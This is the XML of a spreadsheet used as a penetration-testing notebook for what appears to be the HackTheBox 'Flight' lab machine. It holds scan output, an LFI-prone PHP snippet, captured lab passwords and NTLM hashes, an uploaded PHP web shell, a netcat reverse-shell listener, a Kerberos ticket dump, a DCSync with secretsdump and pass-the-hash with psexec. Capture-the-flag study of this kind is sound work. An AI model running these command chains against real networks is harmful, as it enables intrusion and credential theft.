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13_ncr:1_{31E43CEF-2C14-44E6-8D12-8C69434E5AE6}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-135" yWindow="-16335" windowWidth="29070" windowHeight="15750" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
    <sheet name="Reverse Engineering" sheetId="6" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Network!$A$1:$K$1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E3" i="1"/>
  <c r="E4" i="1"/>
  <c r="E5" i="1"/>
  <c r="E6" i="1"/>
  <c r="E7" i="1"/>
  <c r="E8" i="1"/>
  <c r="E9" i="1"/>
  <c r="E10" i="1"/>
  <c r="E11" i="1"/>
  <c r="E12" i="1"/>
  <c r="E13" i="1"/>
  <c r="E14" i="1"/>
  <c r="E15" i="1"/>
  <c r="E16" i="1"/>
  <c r="E17" i="1"/>
  <c r="E18" i="1"/>
  <c r="E19" i="1"/>
  <c r="E20" i="1"/>
  <c r="E2" i="1"/>
  <c r="F2" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="232" uniqueCount="178">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>Port + Protocol</t>
  </si>
  <si>
    <t>#=LEFT($D2,FIND("/",$D2)-1)</t>
  </si>
  <si>
    <t>#=MID($D2,FIND("/",$D2)+1,LEN($D2))</t>
  </si>
  <si>
    <t>Files/Artifacts</t>
  </si>
  <si>
    <t>Misc</t>
  </si>
  <si>
    <t>cat hosts /etc/hosts | sudo tee /etc/hosts | head -1</t>
  </si>
  <si>
    <t>80/tcp</t>
  </si>
  <si>
    <t>Task</t>
  </si>
  <si>
    <t>App</t>
  </si>
  <si>
    <t>Sub task</t>
  </si>
  <si>
    <t>445/tcp</t>
  </si>
  <si>
    <t>135/tcp</t>
  </si>
  <si>
    <t>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</t>
  </si>
  <si>
    <t>389/tcp</t>
  </si>
  <si>
    <t>3269/tcp</t>
  </si>
  <si>
    <t>593/tcp</t>
  </si>
  <si>
    <t>9389/tcp</t>
  </si>
  <si>
    <t>49667/tcp</t>
  </si>
  <si>
    <t>49673/tcp</t>
  </si>
  <si>
    <t>139/tcp</t>
  </si>
  <si>
    <t>88/tcp</t>
  </si>
  <si>
    <t>49684/tcp</t>
  </si>
  <si>
    <t>49674/tcp</t>
  </si>
  <si>
    <t>53/tcp</t>
  </si>
  <si>
    <t>464/tcp</t>
  </si>
  <si>
    <t>49692/tcp</t>
  </si>
  <si>
    <t>53/udp</t>
  </si>
  <si>
    <t>636/tcp</t>
  </si>
  <si>
    <t>3268/tcp</t>
  </si>
  <si>
    <t>53/tcp    open  domain        Simple DNS Plus</t>
  </si>
  <si>
    <t>80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE</t>
  </si>
  <si>
    <t>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-05 20:59:21Z)</t>
  </si>
  <si>
    <t>135/tcp   open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</t>
  </si>
  <si>
    <t>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>445/tcp   open  microsoft-ds?</t>
  </si>
  <si>
    <t>464/tcp   open  kpasswd5?</t>
  </si>
  <si>
    <t>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>636/tcp   open  tcpwrapped</t>
  </si>
  <si>
    <t>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>3269/tcp  open  tcpwrapped</t>
  </si>
  <si>
    <t>9389/tcp  open  mc-nmf        .NET Message Framing</t>
  </si>
  <si>
    <t>49667/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>49674/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49684/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49692/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>dir /r</t>
  </si>
  <si>
    <t xml:space="preserve">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.flight.htb" -u http://flight.htb -fw 1546 </t>
  </si>
  <si>
    <t>Subdomain school.</t>
  </si>
  <si>
    <t xml:space="preserve">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.g0.flight.htb" -u http://g0.flight.htb -fw 1546 </t>
  </si>
  <si>
    <t>53/udp open  domain  Simple DNS Plus
|_dns-recursion: Recursion appears to be enabled</t>
  </si>
  <si>
    <t xml:space="preserve">gobuster dir -u http://flight.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </t>
  </si>
  <si>
    <t>Resource</t>
  </si>
  <si>
    <t>https://thewireshark.com/2025/02/gobuster-directory-brute-force/</t>
  </si>
  <si>
    <t>gobuster dns -d flight.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt</t>
  </si>
  <si>
    <t>school
Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at school.flight.htb Port 80</t>
  </si>
  <si>
    <t>gobuster dir -u http://flight.htb -w ~/htb/wordlists/wordpress.fuzz.txt</t>
  </si>
  <si>
    <t xml:space="preserve">ffuf -w directory-list-2.3-medium.txt -u http://school.flight.htb/index.php?view=FUZZ -e .php,.bak,.old,.zip,.sql,.txt -fw 144  </t>
  </si>
  <si>
    <t>http://school.flight.htb</t>
  </si>
  <si>
    <t>python3 -m http.server 8000</t>
  </si>
  <si>
    <t>responder -I tun0 -v</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">### XAMPP Default Passwords ### 1) MySQL (phpMyAdmin): User: root Password: (means no password!) 2) FileZilla FTP: [ You have to create a new user on the FileZilla Interface ] 3) Mercury (not in the USB &amp; lite version): Postmaster: Postmaster (postmaster@localhost) Administrator: Admin (admin@localhost) User: newuser Password: wampp 4) WEBDAV: User: xampp-dav-unsecure Password: ppmax2011 Attention: WEBDAV is not active since XAMPP Version 1.7.4. For activation please comment out the httpd-dav.conf and following modules in the httpd.conf LoadModule dav_module modules/mod_dav.so LoadModule dav_fs_module modules/mod_dav_fs.so Please do not forget to refresh the WEBDAV authentification (users and passwords). 
# Example MySQL config file for small systems. # # This is for a system with little memory (&lt;= 64M) where MySQL is only used # from time to time and it's important that the mysqld daemon # doesn't use much resources. # # You can copy this file to # /xampp/mysql/bin/my.cnf to set global options, # mysql-data-dir/my.cnf to set server-specific options (in this # installation this directory is /xampp/mysql/data) or # ~/.my.cnf to set user-specific options. # # In this file, you can use all long options that a program supports. # If you want to know which options a program supports, run the program # with the "--help" option. # The following options will be passed to all MySQL clients [client] # password = your_password port = 3306 socket = "/xampp/mysql/mysql.sock" # Here follows entries for some specific programs # The MySQL server [mysqld] port= 3306 socket = "/xampp/mysql/mysql.sock" basedir = "/xampp/mysql" tmpdir = "/xampp/tmp" datadir = "/xampp/mysql/data" pid_file = "mysql.pid" # enable-named-pipe key_buffer = 16M max_allowed_packet = 1M sort_buffer_size = 512K net_buffer_length = 8K read_buffer_size = 256K read_rnd_buffer_size = 512K myisam_sort_buffer_size = 8M log_error = "mysql_error.log" # Change here for bind listening # bind-address="127.0.0.1" # bind-address = ::1 # for ipv6 # Where do all the plugins live plugin_dir = "/xampp/mysql/lib/plugin/" # Don't listen on a TCP/IP port at all. This can be a security enhancement, # if all processes that need to connect to mysqld run on the same host. # All interaction with mysqld must be made via Unix sockets or named pipes. # Note that using this option without enabling named pipes on Windows # (via the "enable-named-pipe" option) will render mysqld useless! # # commented in by lampp security #skip-networking #skip-federated # Replication Master Server (default) # binary logging is required for replication # log-bin deactivated by default since XAMPP 1.4.11 #log-bin=mysql-bin # required unique id between 1 and 2^32 - 1 # defaults to 1 if master-host is not set # but will not function as a master if omitted server-id = 1 # Replication Slave (comment out master section to use this) # # To configure this host as a replication slave, you can choose between # two methods : # # 1) Use the CHANGE MASTER TO command (fully described in our manual) - # the syntax is: # # CHANGE MASTER TO MASTER_HOST=, MASTER_PORT=, # MASTER_USER=, MASTER_PASSWORD= ; # # where you replace , , by quoted strings and # by the master's port number (3306 by default). # # Example: # # CHANGE MASTER TO MASTER_HOST='125.564.12.1', MASTER_PORT=3306, # MASTER_USER='joe', MASTER_PASSWORD='secret'; # # OR # # 2) Set the variables below. However, in case you choose this method, then # start replication for the first time (even unsuccessfully, for example # if you mistyped the password in master-password and the slave fails to # connect), the slave will create a master.info file, and any later # change in this file to the variables' values below will be ignored and # overridden by the content of the master.info file, unless you shutdown # the slave server, delete master.info and restart the slaver server. # For that reason, you may want to leave the lines below untouched # (commented) and instead use CHANGE MASTER TO (see above) # # required unique id between 2 and 2^32 - 1 # (and different from the master) # defaults to 2 if master-host is set # but will not function as a slave if omitted #server-id = 2 # # The replication master for this slave - required #master-host = # # The username the slave will use for authentication when connecting # to the master - required #master-user = # # The password the slave will authenticate with when connecting to # the master - required #master-password = # # The port the master is listening on. # optional - defaults to 3306 #master-port = # # binary logging - not required for slaves, but recommended #log-bin=mysql-bin # Point the following paths to different dedicated disks #tmpdir = "/xampp/tmp" #log-update = /path-to-dedicated-directory/hostname # Uncomment the following if you are using BDB tables #bdb_cache_size = 4M #bdb_max_lock = 10000 # Comment the following if you are using InnoDB tables #skip-innodb innodb_data_home_dir = "/xampp/mysql/data" innodb_data_file_path = ibdata1:10M:autoextend innodb_log_group_home_dir = "/xampp/mysql/data" #innodb_log_arch_dir = "/xampp/mysql/data" ## You can set .._buffer_pool_size up to 50 - 80 % ## of RAM but beware of setting memory usage too high innodb_buffer_pool_size = 16M ## Set .._log_file_size to 25 % of buffer pool size innodb_log_file_size = 5M innodb_log_buffer_size = 8M innodb_flush_log_at_trx_commit = 1 innodb_lock_wait_timeout = 50 ## UTF 8 Settings #init-connect=\'SET NAMES utf8\' #collation_server=utf8_unicode_ci #character_set_server=utf8 #skip-character-set-client-handshake #character_sets-dir="/xampp/mysql/share/charsets" sql_mode=NO_ZERO_IN_DATE,NO_ZERO_DATE,NO_ENGINE_SUBSTITUTION log_bin_trust_function_creators = 1 [mysqldump] quick max_allowed_packet = 16M [mysql] no-auto-rehash # Remove the next comment character if you are not familiar with SQL #safe-updates [isamchk] key_buffer = 20M sort_buffer_size = 20M read_buffer = 2M write_buffer = 2M [myisamchk] key_buffer = 20M sort_buffer_size = 20M read_buffer = 2M write_buffer = 2M [mysqlhotcopy] interactive-timeout 
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>svc_apache:S@Ss!K@*t13</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Dope looks like you can do RFI. I tried it with my own URL. I might try to put in a PHP reverse shell.
Ok that didn't work. It's an HTML page.
LFI. meeting.zip?
Oh right you can look at index.php.
if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "&lt;h1&gt;Suspicious Activity Blocked!";
    echo "&lt;h3&gt;Incident will be reported&lt;/h3&gt;\r\n";
}else{
    echo file_get_contents($_GET['view']);	
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Note, this full path works. C:\\xampp\\htdocs\\school.flight.htb\\home.html</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
C:\xampp\passwords.txt                    ← default XAMPP creds, plaintext
C:\xampp\phpMyAdmin\config.inc.php        ← phpMyAdmin's DB connection creds
C:\xampp\mysql\bin\my.ini                 ← MySQL config, sometimes creds
C:\xampp\security\webdav.htpasswd         ← WebDAV hashes
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Holy moly, all you could do is do an SMB request. svc_apache:S@Ss!K@*t13</t>
    </r>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x64</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x65</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x66</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x67</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x68</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x69</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x70</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x71</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x72</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x73</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x74</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x75</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x76</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x77</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x78</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x79</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x80</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x81</t>
  </si>
  <si>
    <t>Windows 10 / Server 2019 Build 17763 x82</t>
  </si>
  <si>
    <t>flight.htb</t>
  </si>
  <si>
    <t xml:space="preserve">grep -iRna "c\.bum" . </t>
  </si>
  <si>
    <t>find . -iname '*.ps1'</t>
  </si>
  <si>
    <t>lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users</t>
  </si>
  <si>
    <t>https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</t>
  </si>
  <si>
    <t>https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
https://github.com/Greenwolf/ntlm_theft</t>
  </si>
  <si>
    <t>smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'
smb: \&gt; prompt off
smb: \&gt; mput *</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">No anon check. Was able to login as svc_apache. Found other users.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Password was for s.moon.
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Have to use new technique. ntl_theft.
SMB auth and responder. Looks like you add the file to the host and someone clicks it.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Tikkycoll_431012284 (c.bum) </t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">C.Bum
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Group: 'WebDevs' (RID: 1614) has member: flight\C.Bum</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
s.moon
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">c.bum::flight.htb:42d45184e3bdf8ff:64C7C9B85553FA9071EFE9887E2417DD:0101000000000000804D9A22520DDD012377A8D3776B5ABE0000000002000800340058004B00490001001E00570049004E002D00500033004900420037004A005500580046005500590004003400570049004E002D00500033004900420037004A00550058004600550059002E00340058004B0049002E004C004F00430041004C0003001400340058004B0049002E004C004F00430041004C0005001400340058004B0049002E004C004F00430041004C0007000800804D9A22520DDD010600040002000000080030003000000000000000000000000030000021A7AB9E8EA0998F488CA642BFA014E9374B432ACBB4AAE3BFAA0866188D22D40A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100330031000000000000000000    
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Tikkycoll_431012284 (c.bum)   </t>
    </r>
  </si>
  <si>
    <t>smbclient //flight.htb/Web -U C.Bum 'Tikkycoll_431012284'</t>
  </si>
  <si>
    <t>put simpleshell.php</t>
  </si>
  <si>
    <t>curl http://school.flight.htb/styles/simpleshell.php?cmd=whoami</t>
  </si>
  <si>
    <t>flight\svc_apache</t>
  </si>
  <si>
    <t>echo %PROCESSOR_ARCHITECTURE%</t>
  </si>
  <si>
    <t>.\winPEASx86.exe</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">IIS APPPOOL\.NET v4.5 Classic
    IIS APPPOOL\.NET v4.5
    flight\Administrator
    flight\svc_apache
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">    flight\C.Bum</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
</t>
    </r>
  </si>
  <si>
    <t>Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object { try { if ((Get-Acl $_.FullName -ErrorAction Stop).Owner -match "username") { $_.FullName } } catch {} }</t>
  </si>
  <si>
    <t>netstat -ano | findstr LISTENING</t>
  </si>
  <si>
    <t>net user C.Bum</t>
  </si>
  <si>
    <t>https://github.com/antonioCoco/RunasCs</t>
  </si>
  <si>
    <t>rlwrap -cAr nc -lnvp 443</t>
  </si>
  <si>
    <t>flight\c.bum</t>
  </si>
  <si>
    <t>user.txt: 7a60c71a161fbc8c49adac7cca7415a4</t>
  </si>
  <si>
    <t xml:space="preserve">On host as svc_apache.
Okay in C:\inetpub\ there is a folder that has (OI)(CI)(W). Write access is inherited by every file and container underneath that folder.
Development directory.
Okay so you have to create a runas.exe reverse shell in ProgramData directory on C:\ in order to make an authenticated call back to host machine.
Not you use runas when you want a shell as another user. It allows you run another program which in this case is cmd.exe.
</t>
  </si>
  <si>
    <t xml:space="preserve">Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
flight\WebDevs                             Group            S-1-5-21-4078382237-1492182817-2568127209-1614 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192   </t>
  </si>
  <si>
    <t>C:\inetpub&gt;whoami /all
whoami /all
USER INFORMATION
----------------
User Name    SID                                           
============ ==============================================
flight\c.bum S-1-5-21-4078382237-1492182817-2568127209-1607
GROUP INFORMATION
-----------------
Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
flight\WebDevs                             Group            S-1-5-21-4078382237-1492182817-2568127209-1614 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
USER CLAIMS INFORMATION
-----------------------
User claims unknown.
Kerberos support for Dynamic Access Control on this device has been disabled.</t>
  </si>
  <si>
    <t>icacls *</t>
  </si>
  <si>
    <t>tasklist /v</t>
  </si>
  <si>
    <t>https://blog.geekinstitute.org/2025/05/gaining-access-to-windows-system-using-msfvenom-and-metasploit.html</t>
  </si>
  <si>
    <t>meterpreter &gt; upload ~/htb/tools/chisel/chisel.exe</t>
  </si>
  <si>
    <t>sudo ./chisel_1.11.8_linux_amd64 server -p 9000 --reverse</t>
  </si>
  <si>
    <t>ctrl+z - channel -i 2</t>
  </si>
  <si>
    <t>ctrl+z - sessions 1</t>
  </si>
  <si>
    <t>On host as user.
Development flight\C.Bum has permissions.
Used chisel to connect to internal site on port 8000.
Okay reverse shell to admin is hard.
Trying to get shell as defaultapppool via aspx file.</t>
  </si>
  <si>
    <t>dir C:\Windows\Microsoft.NET\Framework64</t>
  </si>
  <si>
    <t>defaultapppool</t>
  </si>
  <si>
    <t>.\rubeus.exe tgtdeleg /nowrap</t>
  </si>
  <si>
    <t>doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECqf2r4iclNizCesTD9JSa6xUOKPJ0t6Kufo++jsC2ZJNlE4k2xNeYvYNQrzjRBUpip5ModVWhTPUi6CMo+jOZPcsW+uT8Lm9eYABXIofL5eqGSDqjRsL8W2DJjwkis6U2FUbu0zI5FDLafpNQqzFsnIqk8/O9f4OR76njn94pXG81fkO+YYJ/MMIm9rfU1Z/kmfYlrpoYVoSZQe7nBJedycDdiZHyhNtJMlEj8fnJsUiUw10xgzGbCFRwkOvWQDrJUxVVqw6AzRRGPypu8ocIRuo0KvgNVKJqwcFqhYL5S3qGneFLX4ldYKQ7HQAZoO6H5zkVeDvuauio7xQGqELhCLktaVzuWcwBC0YXfoXxxVl9cr0vFNS2XEyO5cYeNRtGcxnBGj+iS2mM5DS8icrBPvxq9Q8GoaFC7lQCQ+CGCdq2SisyaX2LceM/exd4a5RgfUCbGGIsr2o7I8cC5LK0r0KUsn5OXIESA5YEHPeWNIM7Cxh7ktK6sQcHroA2iOkPOzOH279XHBIYMsmKQOTpZYrRrAP7TJuG1uRR/QC/YGAyzfo0vEvvdJPEXGYO7/+vlkYxUdsCcBVXgKArW+s+1+pw+yJtzyLgcv00Bj9o3TbRf/OiYkRF9oGZRduz9T4OMq094ibvXrmdxAUZBBJPYo1tNklyj4920P8S9AQ6Dp+3Y0B5rZhStp3hhMocMScZZ93DJXtDGtsYCLqpm8NQHQlvPkbLK29A4cCp5XeH9glPFbvnp9XdnVcHmIz3n1UlGzHPbXeh4DdYAfFa6hp0/luTHtEay0ww8MKm76e/56sXnyp5VGJ04LKkPSkwUVutfx9gj/oXHJFJlXsUGH9pd0cuvWxS0WvjzFAgLQz+CLmWytAszbnGG7I9XYsmVhOLIg5mYgMSPzSW3SEke1GgHhTn74tdjybCYzgCdA5+5pv9A00msZ41mqpmTaBhVdmOH5F94Ljs7k6viLjoerTJbYkQHzouWt/HRBhyWPJgdzxtBGflT6QvXiOFr02/fJKF3Uoy1ZLA6t0Uvb3bk3Bw5t/tuuEMs2eCCc2d+bcvOZDz/rnC9Qn27McJTKiLXYB74N74locgSGY0pjalJ5aDdR4w09seYdy4l5WrNwFIkera3kRoSmqis7RQsQtUgqapPwEhlOylhDitKUs8DvVA67btKRDg0DH+9KoL74YVgczVYa3E0byJGNRE4q2bi0Q9IftIZUNzvWGECtO6jXs1TJZG2F0TKmGobojMMa4M6jXqvCAlhnClSlSmT4T48HnI03qsR/f1i7pbK4XYVDtq3jrHUd0fQq1O9xHiHZSQPvviogEmQ/K07q78DAKwxoQdCWucP13HFgFwTaW4hTZm47vjqjd7l6cHPIAo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgUNypNzhQYyMW4BUlca0HDVm8WJE71R0Rx2NUsN3uXrShDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI2MDcxMTA5MjEzN1qmERgPMjAyNjA3MTExOTIxMzdapxEYDzIwMjYwNzE4MDkyMTM3WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC</t>
  </si>
  <si>
    <t>cat tgt_raw.txt | tr -d '\n' | base64 -d &gt; ticket.kirb</t>
  </si>
  <si>
    <t>impacket-ticketConverter ticket.kirbi ticket.ccache</t>
  </si>
  <si>
    <t xml:space="preserve">export KRB5CCNAME=ticket.ccache </t>
  </si>
  <si>
    <t>sudo ntpdate flight.htb</t>
  </si>
  <si>
    <t>secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator</t>
  </si>
  <si>
    <t>nxc smb flight.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c</t>
  </si>
  <si>
    <t>rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c</t>
  </si>
  <si>
    <t>Running rubeus 4.5 to get TGT of machine account.
Got admin hash from machine account secretsdump. This was through a dc sync attack via the machine account.</t>
  </si>
  <si>
